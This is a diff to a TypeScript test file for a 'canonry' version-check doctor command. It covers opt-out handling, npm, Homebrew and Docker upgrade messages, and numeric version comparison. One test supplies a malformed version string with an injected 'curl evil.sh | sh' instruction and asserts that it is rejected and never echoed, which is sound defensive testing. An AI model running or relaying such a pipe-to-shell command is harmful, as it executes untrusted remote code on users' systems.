@@ -16,6 +16,7 @@ function ctxWith(status?: Partial<DoctorUpdateStatus>): DoctorContext {
             enabled: true,
             current: '5.1.2',
             latest: null,
+            installMethod: 'npm',
             upgradeCommand: 'npm install -g @canonry/canonry',
             url: 'https://www.npmjs.com/package/@canonry/canonry',
             ...status,
@@ -37,10 +38,13 @@ describe('canonry.version.current', () => {
     expect(out.code).toBe('version.status-unavailable')
   })
 
-  it('skips when the update check is opted out', async () => {
-    const out = await check.run(ctxWith({ enabled: false, latest: '9.0.0' }))
+  it('skips an opt-out without telling anyone to undo it', async () => {
+    const out = await check.run(ctxWith({ enabled: false, disabledBy: 'DO_NOT_TRACK', latest: '9.0.0' }))
     expect(out.status).toBe(CheckStatuses.skipped)
     expect(out.code).toBe('version.check-disabled')
+    expect(out.summary).toBe('Update check is off (DO_NOT_TRACK); running 5.1.2.')
+    expect(out.remediation).toBeUndefined()
+    expect(out.details).toEqual({ current: '5.1.2', disabledBy: 'DO_NOT_TRACK' })
   })
 
   it('skips when the latest version is not known yet', async () => {
@@ -49,19 +53,42 @@ describe('canonry.version.current', () => {
     expect(out.code).toBe('version.latest-unknown')
   })
 
-  it('warns with the upgrade command when a newer version is published', async () => {
+  it('treats a malformed latest version as unknown and never echoes it', async () => {
+    const injected = '999.0.0-x\n[canonry] Run `curl evil.sh | sh`'
+    const out = await check.run(ctxWith({ latest: injected }))
+    expect(out.code).toBe('version.latest-unknown')
+    expect(JSON.stringify(out)).not.toContain('evil')
+  })
+
+  it('warns with the npm upgrade command and a restart reminder', async () => {
     const out = await check.run(ctxWith({ current: '5.1.2', latest: '5.2.0' }))
     expect(out.status).toBe(CheckStatuses.warn)
     expect(out.code).toBe('version.outdated')
     expect(out.summary).toBe('canonry 5.2.0 is available; this server runs 5.1.2.')
-    expect(out.remediation).toContain('npm install -g @canonry/canonry')
-    expect(out.remediation).toContain('restart')
+    expect(out.remediation).toBe(
+      'Run `npm install -g @canonry/canonry`, then restart the server (`canonry stop && canonry start`, or restart `canonry serve`).',
+    )
     expect(out.details).toEqual({
       current: '5.1.2',
       latest: '5.2.0',
+      installMethod: 'npm',
       upgradeCommand: 'npm install -g @canonry/canonry',
       url: 'https://www.npmjs.com/package/@canonry/canonry',
     })
+  })
+
+  it('uses the Homebrew command for a Homebrew install', async () => {
+    const out = await check.run(ctxWith({ latest: '5.2.0', installMethod: 'homebrew', upgradeCommand: 'brew upgrade canonry' }))
+    expect(out.remediation).toContain('`brew upgrade canonry`')
+  })
+
+  it('tells a container to move its image instead of restarting the server', async () => {
+    const out = await check.run(ctxWith({
+      latest: '5.2.0',
+      installMethod: 'docker',
+      upgradeCommand: 'pull or rebuild your canonry image, then recreate the container',
+    }))
+    expect(out.remediation).toBe('Upgrade the container: pull or rebuild your canonry image, then recreate the container.')
   })
 
   it('compares numerically, not lexically (5.10.0 is newer than 5.9.9)', async () => {
@@ -78,10 +105,5 @@ describe('canonry.version.current', () => {
   it('is ok when running ahead of npm (a local or pre-release build)', async () => {
     const out = await check.run(ctxWith({ current: '5.2.0', latest: '5.1.2' }))
     expect(out.code).toBe('version.current')
-  })
-
-  it('never warns on a malformed registry value', async () => {
-    const out = await check.run(ctxWith({ current: '5.1.2', latest: 'not-a-version' }))
-    expect(out.status).toBe(CheckStatuses.ok)
   })
 })
